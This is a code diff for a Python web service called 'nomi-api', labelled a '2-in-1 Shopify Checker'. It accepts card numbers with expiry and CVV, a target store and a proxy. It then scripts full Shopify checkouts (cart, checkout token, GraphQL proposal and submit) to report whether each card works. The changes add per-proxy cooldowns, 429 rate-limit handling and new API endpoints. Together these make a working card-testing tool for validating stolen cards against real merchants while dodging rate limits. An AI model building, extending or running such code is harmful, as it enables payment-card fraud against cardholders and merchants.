@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ═══════════════════════════════════════════════════════════════════════════
-# API.py — Shopify Checkout API Server (Robust Version)
+# API.py — 2-in-1 Shopify Checker (429-safe)
 # ═══════════════════════════════════════════════════════════════════════════
 import os
 import re
@@ -8,20 +8,23 @@ import sys
 import json
 import time
 import random
-import signal
 import logging
 import asyncio
+import threading
 import traceback
 from logging.handlers import RotatingFileHandler
 from concurrent.futures import ThreadPoolExecutor
+from collections import defaultdict
 
 import requests
-from aiohttp import web
+import uvicorn
+from fastapi import FastAPI, Request, Query
+from fastapi.responses import JSONResponse
 
 # ═══ CONFIG ═══
 HOST    = os.environ.get("API_HOST", "0.0.0.0")
-PORT    = int(os.environ.get("API_PORT", "8080"))
-WORKERS = int(os.environ.get("API_WORKERS", "40"))
+PORT    = int(os.environ.get("API_PORT", os.environ.get("PORT", "8080")))
+WORKERS = int(os.environ.get("API_WORKERS", "15"))
 
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
@@ -59,6 +62,24 @@ _root.addHandler(_file_err)
 log = logging.getLogger("api")
 
 
+# ═══ PROXY RATE LIMITER ═══
+# Track last-use timestamp per proxy to avoid hammering same IP
+_proxy_last_use = defaultdict(float)
+_proxy_lock = threading.Lock()
+_PROXY_COOLDOWN = 0.8  # seconds between requests on same proxy
+
+
+def _wait_for_proxy(proxy_key: str):
+    """Ensure at least _PROXY_COOLDOWN between requests on same proxy."""
+    with _proxy_lock:
+        now = time.monotonic()
+        last = _proxy_last_use.get(proxy_key, 0.0)
+        wait = _PROXY_COOLDOWN - (now - last)
+        if wait > 0:
+            time.sleep(wait)
+        _proxy_last_use[proxy_key] = time.monotonic()
+
+
 # ═══ PROXY PARSER ═══
 def parse_proxy(p):
     if not p:
@@ -79,7 +100,7 @@ def parse_proxy(p):
     return None
 
 
-# ═══ GRAPHQL QUERIES (unchanged) ═══
+# ═══ GRAPHQL QUERIES (same as before) ═══
 PROPOSAL_QUERY = (
     "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
     "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
@@ -171,46 +192,30 @@ def addr():
     }
 
 
-# ═══ HELPER: fetch cart token robustly ═══
-def _get_cart_token(session, site, add_response_text=""):
+# ═══ SAFE JSON PARSE ═══
+def safe_json(resp, site=""):
     """
-    Try multiple ways to obtain cart token.
-    Returns token string or None.
+    Parse JSON safely. Detects 429/HTML error pages.
+    Returns (data, error_str).
     """
-    # Method 1: /cart.js
-    for attempt in range(3):
-        try:
-            r = session.get(f"https://{site}/cart.js", timeout=15)
-            if r.status_code == 200:
-                try:
-                    j = r.json()
-                    tok = j.get("token")
-                    if tok:
-                        return tok
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        time.sleep(0.5)
+    try:
+        text = resp.text or ""
+    except Exception as e:
+        return None, f"read_error:{type(e).__name__}"
 
-    # Method 2: parse from /cart/add.js response body
-    if add_response_text:
-        for pat in [
-            r'"token"\s*:\s*"([^"]+)"',
-            r'"cart_token"\s*:\s*"([^"]+)"',
-            r"cart_token=([^;\"']+)",
-        ]:
-            m = re.search(pat, add_response_text)
-            if m:
-                return m.group(1)
+    # Detect rate limit
+    if resp.status_code == 429:
+        return None, "rate_limited"
 
-    # Method 3: parse from cookie jar
-    for cookie in session.cookies:
-        if cookie.name in ("cart", "cart_sig", "cart_token", "cart_currency"):
-            if cookie.name == "cart" and cookie.value:
-                return cookie.value
+    # Detect HTML
+    stripped = text.lstrip()[:50].lower()
+    if stripped.startswith("<!doctype") or stripped.startswith("<html"):
+        return None, "html_response"
 
-    return None
+    try:
+        return json.loads(text), None
+    except Exception:
+        return None, "invalid_json"
 
 
 # ═══ CHECKOUT FLOW ═══
@@ -235,16 +240,18 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
         yyyy = "20" + yyyy
 
     site = re.sub(r"^https?://", "", site_raw.strip()).rstrip("/")
-    # strip any path
     site = site.split("/")[0]
-
     proxy_url = parse_proxy(proxy_raw) if proxy_raw else None
+
+    # ── Rate limit per proxy ──
+    proxy_key = proxy_url or "direct"
+    _wait_for_proxy(proxy_key)
 
     s = requests.Session()
     s.headers.update({
         "User-Agent": UA,
         "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Encoding": "gzip, deflate",
         "Connection": "keep-alive",
     })
     if proxy_url:
@@ -263,14 +270,22 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             log.warning(f"[{site}] products.json: {type(e).__name__}")
             return out
 
+        if r.status_code == 429:
+            out["Response"] = "Site Error: HTTP 429 (Rate Limited)"
+            out["Status"] = "Site Error"
+            return out
+
         if r.status_code != 200:
             out["Response"] = f"Site Error: HTTP {r.status_code}"
             out["Status"] = "Site Error"
             return out
 
-        try:
-            data = r.json()
-        except Exception:
+        data, jerr = safe_json(r, site)
+        if jerr == "rate_limited":
+            out["Response"] = "Site Error: HTTP 429 (Rate Limited)"
+            out["Status"] = "Site Error"
+            return out
+        if data is None:
             out["Response"] = "Site Error: invalid products JSON"
             out["Status"] = "Site Error"
             return out
@@ -312,24 +327,43 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                 timeout=15,
             )
             add_resp_text = r.text or ""
+            if r.status_code == 429:
+                out["Response"] = "Site Error: HTTP 429 (Rate Limited)"
+                out["Status"] = "Site Error"
+                return out
             if r.status_code != 200:
                 out["Response"] = f"Failed to create checkout: cart HTTP {r.status_code}"
                 out["Status"] = "Site Error"
-                log.debug(f"[{site}] cart/add.js {r.status_code}: {add_resp_text[:200]}")
                 return out
         except Exception as e:
             out["Response"] = f"Site Error: {type(e).__name__}"
             out["Status"] = "Site Error"
             return out
 
-        # ── 3. Cart token (robust) ──
-        cart_token = _get_cart_token(s, site, add_resp_text)
+        # ── 3. Cart token ──
+        cart_token = None
+        for attempt in range(3):
+            try:
+                r = s.get(f"https://{site}/cart.js", timeout=15)
+                if r.status_code == 200:
+                    j, _ = safe_json(r, site)
+                    if j and j.get("token"):
+                        cart_token = j["token"]
+                        break
+            except Exception:
+                pass
+            time.sleep(0.4)
+
+        if not cart_token and add_resp_text:
+            for pat in [r'"token"\s*:\s*"([^"]+)"', r"cart_token=([^;\"']+)"]:
+                m = re.search(pat, add_resp_text)
+                if m:
+                    cart_token = m.group(1)
+                    break
+
         if not cart_token:
             out["Response"] = "Site Error: no cart token"
             out["Status"] = "Site Error"
-            log.warning(
-                f"[{site}] no cart token — cookies={[c.name for c in s.cookies]}"
-            )
             return out
 
         # ── 4. Init checkout ──
@@ -347,6 +381,11 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                 allow_redirects=False,
                 timeout=15,
             )
+
+            if r.status_code == 429:
+                out["Response"] = "Site Error: HTTP 429 (Rate Limited)"
+                out["Status"] = "Site Error"
+                return out
 
             if r.status_code not in (301, 302, 303, 307, 308):
                 out["Response"] = "Site Error: no redirect"
@@ -377,6 +416,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             out["Status"] = "Site Error"
             return out
 
+        # Extract tokens
         session_token = None
         for pat in [
             r'"serializedSessionToken"\s*:\s*"([^"]+)"',
@@ -518,8 +558,17 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
         for attempt in range(6):
             try:
                 r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
-                j = r.json()
             except Exception:
+                time.sleep(1)
+                continue
+
+            if r.status_code == 429:
+                out["Response"] = "Site Error: HTTP 429 (Rate Limited)"
+                out["Status"] = "Site Error"
+                return out
+
+            j, jerr = safe_json(r, site)
+            if j is None:
                 time.sleep(1)
                 continue
 
@@ -556,7 +605,15 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                 gql_url, headers=gql_headers,
                 json=proposal_payload(state["delivery"]), timeout=20,
             )
-            j = r.json()
+            if r.status_code == 429:
+                out["Response"] = "Site Error: HTTP 429 (Rate Limited)"
+                out["Status"] = "Site Error"
+                return out
+            j, jerr = safe_json(r, site)
+            if j is None:
+                out["Response"] = "Site Error: invalid proposal JSON"
+                out["Status"] = "Site Error"
+                return out
         except Exception as e:
             out["Response"] = f"Site Error: {type(e).__name__}"
             out["Status"] = "Site Error"
@@ -715,7 +772,15 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
 
         try:
             r = s.post(gql_url, headers=gql_headers, json=submit_payload, timeout=25)
-            j = r.json()
+            if r.status_code == 429:
+                out["Response"] = "Site Error: HTTP 429 (Rate Limited)"
+                out["Status"] = "Site Error"
+                return out
+            j, jerr = safe_json(r, site)
+            if j is None:
+                out["Response"] = "Site Error: invalid submit JSON"
+                out["Status"] = "Site Error"
+                return out
         except Exception as e:
             out["Response"] = f"Site Error: {type(e).__name__}"
             out["Status"] = "Site Error"
@@ -750,7 +815,11 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                     },
                     timeout=25,
                 )
-                j = r.json()
+                if r.status_code == 429:
+                    continue
+                j, jerr = safe_json(r, site)
+                if j is None:
+                    continue
             except Exception:
                 continue
 
@@ -799,17 +868,46 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             pass
 
 
-# ═══ HTTP HANDLERS ═══
+# ═══════════════════════════════════════════════════════════════════════════
+# FASTAPI APP
+# ═══════════════════════════════════════════════════════════════════════════
+app = FastAPI(
+    title="nomi-api",
+    description="2-in-1 Shopify Checker (429-safe)",
+    version="2.1.0",
+)
+
 executor = ThreadPoolExecutor(max_workers=WORKERS)
 
 
-async def handle_check(request):
-    cc    = (request.query.get("cc")    or "").strip()
-    site  = (request.query.get("site")  or "").strip()
-    proxy = (request.query.get("proxy") or "").strip() or None
+async def _run_check(cc: str, site: str, proxy: str | None) -> dict:
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(executor, checkout_sync, cc, site, proxy)
 
+
+@app.get("/")
+async def root():
+    return {
+        "service": "nomi-api",
+        "version": "2.1.0",
+        "status": "OK",
+        "endpoints": ["/shopify", "/Shopify", "/check", "/health", "/docs"],
+    }
+
+
+@app.get("/health")
+async def health():
+    return {"status": "ok", "service": "nomi-api", "workers": WORKERS}
+
+
+@app.get("/shopify")
+async def shopify_get(
+    cc: str = Query(""),
+    site: str = Query(""),
+    proxy: str = Query(None),
+):
     if not cc or not site:
-        return web.json_response({
+        return JSONResponse({
             "Response": "Missing cc or site",
             "Price": "-",
             "Gateway": "Unknown",
@@ -817,77 +915,72 @@ async def handle_check(request):
         })
 
     t0 = time.monotonic()
-    loop = asyncio.get_event_loop()
-    try:
-        result = await loop.run_in_executor(executor, checkout_sync, cc, site, proxy)
-    except Exception as e:
-        log.error(f"[handler] {type(e).__name__}: {e}")
-        result = {
-            "Response": f"Server Error: {type(e).__name__}",
-            "Price": "-",
-            "Gateway": "Unknown",
-            "Status": "Site Error",
-        }
-
+    result = await _run_check(cc, site, proxy)
     elapsed = (time.monotonic() - t0) * 1000
     log.info(
-        f"CHECK site={site[:40]} card={cc[:6]}*** "
+        f"[shopify] site={site[:40]} card={cc[:6]}*** "
         f"status={result.get('Status')} price={result.get('Price')} "
         f"resp={str(result.get('Response'))[:60]!r} time={elapsed:.0f}ms"
     )
-    return web.json_response(result)
+    return JSONResponse(result)
 
 
-async def handle_health(request):
-    return web.json_response({
-        "status": "ok",
-        "service": "nomi-api",
-        "workers": WORKERS,
-    })
+@app.get("/Shopify")
+async def Shopify_get(
+    cc: str = Query(""),
+    site: str = Query(""),
+    proxy: str = Query(None),
+):
+    return await shopify_get(cc=cc, site=site, proxy=proxy)
 
 
-async def handle_root(request):
-    return web.json_response({
-        "service": "nomi-api",
-        "endpoints": ["/shopify", "/Shopify", "/health"],
-        "usage": "GET /shopify?cc=<cc|mm|yyyy|cvv>&site=<site>&proxy=<optional>",
-    })
+@app.get("/check")
+async def check_get(
+    site: str = Query(...),
+    cc: str = Query(...),
+    proxy: str = Query(None),
+):
+    parts = cc.split("|")
+    if len(parts) != 4:
+        return {"status": "error", "message": "Invalid CC format"}
+
+    try:
+        result = await _run_check(cc, site, proxy)
+        return {"status": "success", "result": result}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 
-def make_app():
-    app = web.Application(client_max_size=1024 * 256)
-    app.router.add_get("/", handle_root)
-    app.router.add_get("/health", handle_health)
-    app.router.add_get("/shopify", handle_check)
-    app.router.add_get("/Shopify", handle_check)
-    return app
+@app.post("/check")
+async def check_post(request: Request):
+    try:
+        body = await request.json()
+    except Exception:
+        return {"status": "error", "message": "Invalid JSON body"}
+
+    if not all(k in body for k in ("site", "cc")):
+        return {"status": "error", "message": "Missing site or cc"}
+
+    site = body["site"]
+    cc = body["cc"]
+    proxy = body.get("proxy")
+
+    parts = cc.split("|")
+    if len(parts) != 4:
+        return {"status": "error", "message": "Invalid CC format"}
+
+    try:
+        result = await _run_check(cc, site, proxy)
+        return {"status": "success", "result": result}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 
 if __name__ == "__main__":
     log.info("═" * 60)
-    log.info(f" nomi-api starting on http://{HOST}:{PORT}")
-    log.info(f" Workers (threads) : {WORKERS}")
-    log.info(f" Routes            : /shopify, /Shopify, /health, /")
+    log.info(f" nomi-api 2-in-1 (429-safe) on http://{HOST}:{PORT}")
+    log.info(f" Workers : {WORKERS}")
+    log.info(f" Routes  : /shopify /Shopify /check /health /docs")
     log.info("═" * 60)
 
-    app = make_app()
-    try:
-        web.run_app(
-            app,
-            host=HOST,
-            port=PORT,
-            access_log=None,
-            print=None,
-            shutdown_timeout=10.0,
-        )
-    except KeyboardInterrupt:
-        log.warning("Interrupted by user (Ctrl+C)")
-    except Exception as e:
-        log.critical(f"Fatal error: {e}\n{traceback.format_exc()}")
-        sys.exit(1)
-    finally:
-        try:
-            executor.shutdown(wait=False)
-        except Exception:
-            pass
-        log.info("nomi-api stopped.")
+    uvicorn.run(app, host=HOST, port=PORT, log_level="info", access_log=False)
